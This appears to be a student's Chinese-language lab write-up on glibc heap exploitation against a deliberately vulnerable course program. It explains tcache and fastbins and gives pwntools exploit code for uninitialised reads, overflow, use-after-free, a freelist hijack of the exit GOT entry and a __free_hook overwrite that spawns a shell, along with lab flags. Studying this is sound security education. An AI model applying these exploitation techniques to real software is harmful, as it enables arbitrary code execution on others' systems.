## 实践

1. 阅读 `example.c` 代码，在报告中简述这个目录程序的逻辑；通过 `make build` 完成对程序的编译和 patch，提供 ldd 执行后的截图；(10 points)

这是一个用户信息管理程序，主要功能包括:

基本结构:

- 使用 `struct user_info` 存储用户信息，包含名字、密码、简介和座右铭
- 程序最多可以存储16个用户(MAXUNUM = 16)
- 用 `infos` 数组管理所有用户信息

主要功能:

- 创建用户(user_add): 在空闲位置创建新用户，需要输入名字、密码、简介和座右铭
- 删除用户(user_del): 通过索引和密码验证删除指定用户
- 展示用户(user_show): 输入索引和密码后显示用户全部信息
- 编辑用户(user_edit): 验证密码后可以修改用户名、简介和座右铭

特殊功能:

- 程序包含内存分配跟踪功能(malloc/free hooks)，会打印内存分配和释放的详细信息

- 有一个隐藏的堆内存调试功能(选项6)，可以导出堆内存数据到文件


![image-20241203145539176](https://bu.dusays.com/2024/12/03/674eab7a7f167.png)

![image-20241203144230979](https://bu.dusays.com/2024/12/03/674ea86fd2092.png)

2. 阅读和运行 `test.py` 代码，分析打印的 `dump*.bin` 的内容。要求类似示例图一样将所有申请和释放的对象标记出来，特别标注出 tcache 单向链表管理的对象）；（20 points）

![image-20241203230647827](https://bu.dusays.com/2024/12/03/674f1e98ed366.png)





3. 将 `test.py` 中注释的两行 `handle_del` 取消注释，再次运行，新产生的 `dump*.bin` 和之前的相比有何变化？多释放的属于 `William` 和 `Joseph` 的堆块由什么结构管理，还位于 tcache 链表上么？

**释放对象数量的变化**

- **之前的释放操作**：释放了 7 个对象（Bob、Alice、Jimmy、Jack、Charles、Mark、Vincent）。
- **取消注释后的释放操作**：新增释放了 2 个对象（William 和 Joseph），总共释放了 9 个对象。

**tcache 链表的管理**

- **tcache 的容量限制**：tcache（线程缓存）在每个大小类（size class）中默认最多缓存 7 个已释放的堆块。
- 新增释放的堆块处理：
  - **前 7 个释放的对象**（Bob 到 Vincent）被 tcache 管理，形成一个 LIFO（后进先出）的单向链表。
  - **额外释放的 2 个对象**（William 和 Joseph）由于 tcache 已达到容量上限，不再被 tcache 管理，而是被添加到 **fastbins** 中进行管理。

**新增堆块的管理结构**

- Fastbins 的作用：
  - **Fastbins** 是用于存储快速分配和释放的小尺寸堆块的链表结构。
  - 当 tcache 已满时，额外的释放操作会将堆块添加到 fastbins，以避免内存碎片并提高分配效率。
- William 和 Joseph 的堆块：
  - 由于 tcache 已满，William 和 Joseph 的堆块被添加到 **fastbins** 中进行管理。
  - 这些堆块 **不再位于 tcache 的单向链表上**，而是存在于 fastbins 的链表结构中。



##  堆上常见漏洞 

### 1. uninit

首先，分析代码，可以看到在这里分配了 flag 的大小为 0x40 的堆块后 free 并没有清除。

![image-20241203151523120](https://bu.dusays.com/2024/12/03/674eb0133dd28.png)

通过 pwndbg 可以看到，程序刚开始的堆情况如图，我们只需要读出这个 Free chunk

![image-20241203151842698](https://bu.dusays.com/2024/12/03/674eb0dac5e4d.png)

因此本题 exp如下：

```python
# 省略上方与 test.py 中相同的函数
p.recv()
p.sendline(b"3220103544")
handle_add(b"A", b"A", b"A", b"A")
handle_show(0, b"A")
```

flag：flag{hE4P_cAN_be_DIR7y_4s_5T4CK}

![image-20241203152443244](https://bu.dusays.com/2024/12/03/674eb2436b81b.png)



### 2.overflow

首先检查 libc 和 ld 是否连接正确：

![image-20241203153354556](https://bu.dusays.com/2024/12/03/674eb46a8c642.png)

观察代码：user add 中指定 intro 的 size 为 0x40, 而 user edit 中可以修改 0x60 大小，因此可以利用这个漏洞。

```c
// user add
	printf("introduction > ");
    read(0, intro, 0x40);
    info->intro = intro;
    printf("motto > ");
    read(0, info->motto, 0x18);

// ......

// user edit
	printf("new name > ");
    read(0, info->name, 0x20);
    printf("new introduction > ");
    read(0, info->intro, 0x60);
    printf("new motto > ");
    read(0, info->motto, 0x18);
    infos[index] = info;
```

我们先添加两个用户查看堆块情况：

```python
handle_add(b"0", b"A", b"A", b"A")
handle_add(b"1", b"A", b"A", b"A")
gdb.attach(p)
```

![image-20241203153859969](https://bu.dusays.com/2024/12/03/674eb59c048ff.png)

参照源代码可以验证，0x50 大小的是 intro的堆块，0x70 大小的是 user_info 的堆块。

```c
struct user_info *info = malloc(sizeof(struct user_info));
// .......
char *intro = malloc(0x40);
```

因此，我们可以通过编辑第一个 user 中的 intro 堆，来覆盖第二个 user 的信息。

一开始尝试利用代码如下：

```python
handle_add(b"user1", b"1", b"A" * 0x20, b"A")
handle_add(b"user2", b"1", b"A" * 0x20, b"A")

payload = b"C" * 0x40  # 填充intro
payload += b"BBBB".ljust(0x40, b"\x00")  # 覆盖user2的name
# gdb.attach(p)
handle_edit(0, b"1", b"user1", payload, b"A")

gdb.attach(p)
handle_show(0, b"1")
handle_show(1, b"1")
```

发现这样直接暴力覆盖不可行，下面的堆结构被破坏了，在 edit 之后会发现只剩下两个堆了，导致接下来的查询会报 incorrect password

因此要保留下一个堆的 prevsize 和 size：

```python
handle_add(b"user1", b"1", b"A" * 0x20, b"A")
handle_add(b"user2", b"1", b"A" * 0x20, b"A")

payload = b"C" * 0x40  # 填充intro

#保留下一个堆的 prev_size 和 size
payload += p64(0) + p64(0x71)
payload += b"hackedname"
# gdb.attach(p)
handle_edit(0, b"1", b"user1", payload, b"A")

gdb.attach(p)
handle_show(0, b"1")
handle_show(1, b"1")
```

正常情况下：

<img src="https://bu.dusays.com/2024/12/03/674ec4d5f35c9.png" alt="image-20241203164357745" style="zoom:67%;" />

利用漏洞后：

<img src="C:\Users\Tauh\AppData\Roaming\Typora\typora-user-images\image-20241203185426393.png" alt="image-20241203185426393" style="zoom: 50%;" />

### 3.uaf

​	观察代码发现这里读后并没有清空为 NULL ,因此可以利用这一 uaf 漏洞‘

```c
//user_add
printf("introduction size > ");
int intro_size;
scanf("%d", &intro_size);
// ...

//user_del
free(info->intro);
free(info);
// infos[index] = NULL
```



​	首先，生成两个用户，堆中现在有两个已分配的块，索引分别为 `0` 和 `1`，大小均为 `0x80` 字节。

```python
handle_add(b"user1", b"1", 0x80, b"A" * 0x20, b"1")
handle_add(b"user2", b"1", 0x80, b"B" * 0x20, b"1")
```

​	接下来释放这两个堆。堆中的 `user1` 和 `user2` 被释放，加入到 `tcache` 的 `0x80` 大小类的自由列表中。

```python
handle_del(0, b"1")
handle_del(1, b"1")
```



通过操控 `info[2]->intro` 的内容，我们能够控制 `info[0]` 中的数据，进一步影响 `info[0]->intro` 的内容，就我们能够实现对任意地址的读写操作。

```python
payload = b"C" * 0x30
handle_add(b"user3", b"1", 0x60, payload, b"1") # 2
payload = b"hacked"
handle_show(1, b"1")
```

![image-20241203233125668](C:\Users\Tauh\AppData\Roaming\Typora\typora-user-images\image-20241203233125668.png)

##  堆上漏洞的利用 

### 1. 

​	利用 `overflow/overflow.c` 中的堆溢出漏洞，通过劫持 freelist 的方式（10 points），写 exit GOT 表数据将执行流劫持到 `backdoor` 函数，从而完成弹 shell，执行 `flag.exe` 取得 flag（5 points）

​	

​	前面我们已经获取了堆溢出的方式，现在我们要做的是将`exit`函数执行流劫持到 `backdoor` 函数。我们构造三组堆（也就是三个用户），

​	之后，我们释放两个非相邻的块，这些块会被放入 tcachebins 等待复用

```python
handle_del(0, b"1")
handle_del(2, b"1")
```

<img src="https://bu.dusays.com/2024/12/03/674f0470b0ac3.png" alt="image-20241203211504921" style="zoom:50%;" />





​	接下来重新分配堆块，将info[1] 溢出覆盖到 info[2]，将 info[2] 的 fd 指针指向exit函数的 GOT 表项。

```python
payload = b"C" * 0x40  # 填充intro
#保留下一个堆的 prev_size 和 size
payload += p64(0) + p64(0x71)
payload += p64(elf.got["exit"])

handle_edit(1, b"1", b"user2", payload, b"A")
```

​	第一次分配会使用正常的 tcachebin，但第二次分配时，由于之前的伪造，会将chunk分配到exit的GOT表位置，通过 name 字段写入 backdoor 函数地址。

```python
handle_add(b"user0", b"1", b"A" * 0x3f, b"1")
# gdb.attach(p)

name = p64(elf.sym["backdoor"])
log.info(f"name:{hex(elf.sym['backdoor'])}")

handle_add(name, b"1", b"B" * 0x20, b"1")

p.sendlineafter(b"> ", str(10))
```

​	之后申请新堆块,触发freelist使用被篡改的fd，写入backdoor函数地址到name字段。之后让程序执行 exit()，即完成攻击

​	

![image-20241203215128901](https://bu.dusays.com/2024/12/03/674f0cf8c07f4.png)

​	flag: ssec2023{FreElisT_hijackINg_Is_pOwERful|f1d439b6}

### 2.

​	首先 ldd 查看并调整 libc 路径

![image-20241203222325081](https://bu.dusays.com/2024/12/03/674f14654c9d3.png)

```python
handle_add(b"user0", b"1", 0x800, b"CCCC", b"x")
handle_add(b"user1", b"1", 0x20, b"CCCC", b"x")
```

​	创建两个用户，分别分配大块（0x800字节）和小块（0x20字节）的`intro`，为后续操作铺垫堆内存布局。

```python
handle_del(0, b"1")
_, _, intro_leak = handle_show(0, b"1")
```

​	删除用户0，释放其内存块，但`infos[0]`仍指向已释放的内存。通过`user_show`函数读取已释放内存中的数据，泄漏出`intro`字段的内容（内存地址信息）。

```python
offset = 0x1ecbe0
libc_base = u64(intro_leak[:8].ljust(8, b"\x00")) - offset

success(f"libc_base: {hex(libc_base)}")
# libc.base = libc_base
```

​	通过泄漏的数据计算libc基地址。假设泄漏的数据包含某个libc内的地址（如`__malloc_hook`），通过已知偏移量计算出libc基地址。

```python
handle_add(b"user2", b"1", 0x40, b"CCCC", b"x")
handle_add(b"user3", b"1", 0x40, b"CCCC", b"x")
```

​	创建两个新用户，分配大小为0x40字节的`intro`，进一步调整堆内存布局，为后续的堆覆盖做准备。

```python
handle_del(2, b"1")
handle_del(3, b"1")
```

​	删除用户2和3，释放相应的堆内存块。由于之前的UAF漏洞，`infos[2]`和`infos[3]`仍指向已释放的内存，等待被重用。

```python
handle_edit(3, b"1", p64(libc_base + libc.sym["__free_hook"]), b"x", b"x")
```

​	使用`user_edit`函数，覆盖用户3的`name`、`intro`和`motto`字段。这里将`intro`字段覆盖为`__free_hook`的地址，使得后续对`intro`的写操作实际上写入`__free_hook`。

```python
handle_add(b"user4", b"1", 0x40, b"CCCC", b"x")

handle_add(b"user5", b"1", 0x40, p64(libc_base + libc.sym["system"]), b"x")
```

​	创建用户4，分配新的堆内存块。创建用户5，利用之前覆盖的`__free_hook`地址，将`system`函数的地址写入`__free_hook`。

```python
handle_add(b"user6", b"1", 0x50, b"/bin/sh\x00", b"x")

handle_del(6, b"1")
```

​	创建用户6，其`intro`字段为`"/bin/sh\x00"`。删除用户6，触发`free("/bin/sh")`，由于`__free_hook`已被覆盖为`system`，实际执行的是`system("/bin/sh")`，从而获取shell。



![image-20241203220706926](https://bu.dusays.com/2024/12/03/674f10971bd10.png)

You flag: ssec2023{1_L0ve_tyP3_COnFU510N_s0_muCh|de63868c}
